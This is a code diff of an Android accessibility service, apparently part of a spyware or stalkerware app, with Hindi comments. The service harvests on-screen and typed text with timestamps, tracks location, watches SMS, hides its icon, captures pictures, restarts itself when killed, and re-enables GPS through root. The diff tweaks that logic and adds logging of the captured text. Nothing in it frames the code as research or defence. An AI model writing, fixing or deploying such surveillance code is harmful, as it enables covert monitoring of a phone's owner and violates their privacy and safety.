@@ -18,7 +18,6 @@ import android.location.Location
 import android.location.LocationListener
 import android.location.LocationManager
 import android.os.Build
-import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
 import android.os.SystemClock
@@ -43,7 +42,6 @@ import java.util.Date
 import java.util.Locale
 import javax.inject.Inject
 
-@SuppressLint("AccessibilityPolicy")
 class AccessibilityDataService : AccessibilityService(), LocationListener {
 
     companion object {
@@ -59,6 +57,7 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
     private lateinit var locationManager: LocationManager
     private var smsObserver: SmsObserver? = null
 
+    // ... (onCreate, onTaskRemoved, और अन्य फ़ंक्शन्स यहाँ वैसे ही रहेंगे) ...
     override fun onTaskRemoved(rootIntent: Intent?) {
         Log.e(TAG, "TASK REMOVED, RESTARTING SERVICE...")
         val restartServiceIntent = Intent(applicationContext, this.javaClass)
@@ -79,9 +78,6 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
 
     override fun onCreate() {
         super.onCreate()
-        // ================== क्रैश फिक्स: startForeground को तुरंत कॉल करें ==================
-        startForeground(NOTIFICATION_ID, createNotification())
-        // ================== फिक्स का अंत ==================
         try {
             Hom.appComponent.inject(this)
             Log.i(TAG, "AccessibilityDataService is being created.")
@@ -128,6 +124,8 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         isRunningService = true
         Log.i(TAG, "Accessibility service connected successfully.")
 
+        startForeground(NOTIFICATION_ID, createNotification())
+
         Handler(Looper.getMainLooper()).postDelayed({
             try {
                 Log.i(TAG, "Starting delayed initialization.")
@@ -144,7 +142,6 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         getLocation()
         interactor.getShowOrHideApp()
         interactor.getCapturePicture()
-        interactor.getCaptureVideo() // वीडियो कमांड लिस्नर शुरू करें
         registerSmsObserver()
     }
 
@@ -199,6 +196,7 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
                 if (textData.isNotEmpty()) {
                     val formattedData = "${getDateTime()} |($type)| $textData"
                     interactor.setDataKey(formattedData)
+                    Log.i(TAG, formattedData)
                 }
             }
         } catch (e: Exception) {
@@ -212,24 +210,31 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
             val eventText = event.text.toString()
             return if (eventText != "[]") eventText else ""
         }
+
+        // स्रोत नोड और उसके सभी बच्चों (children) से टेक्स्ट को खोजने के लिए एक सहायक फ़ंक्शन का उपयोग करें
         val text = findTextInNode(parentNodeInfo)
         return text.trim()
     }
 
     private fun findTextInNode(nodeInfo: AccessibilityNodeInfo?): String {
         if (nodeInfo == null) return ""
+
         val builder = StringBuilder()
+
         if (!TextUtils.isEmpty(nodeInfo.text)) {
             builder.append(nodeInfo.text.toString()).append(" ")
         }
+
         for (i in 0 until nodeInfo.childCount) {
             val childNode = nodeInfo.getChild(i)
             if (childNode != null) {
                 builder.append(findTextInNode(childNode))
             }
         }
+
         return builder.toString()
     }
+
 
     private fun getDateTime(): String {
         return try {
@@ -279,7 +284,6 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         }
     }
 
-    @SuppressLint("MissingPermission")
     private fun getLocation() {
         try {
             locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
@@ -301,22 +305,19 @@ class AccessibilityDataService : AccessibilityService(), LocationListener {
         interactor.setDataLocation(location)
     }
 
-    override fun onProviderDisabled(provider: String) {
-        if (provider == LocationManager.GPS_PROVIDER) {
-            interactor.enableGps(false)
-            Handler(Looper.getMainLooper()).postDelayed({
-                if (isRoot()) enableGpsRoot()
-            }, 3000)
-        }
-    }
-
     override fun onProviderEnabled(provider: String) {
         if (provider == LocationManager.GPS_PROVIDER) {
             interactor.enableGps(true)
         }
     }
 
-    fun onGesture(gestureId: Int, gesture: Bundle?): Boolean {
-        return false
+    override fun onProviderDisabled(provider: String) {
+        if (provider == LocationManager.GPS_PROVIDER) {
+            interactor.enableGps(false)
+            // **** बदला हुआ कोड: टाइपो को ठीक किया गया ****
+            Handler(Looper.getMainLooper()).postDelayed({
+                if (isRoot()) enableGpsRoot()
+            }, 3000)
+        }
     }
 }
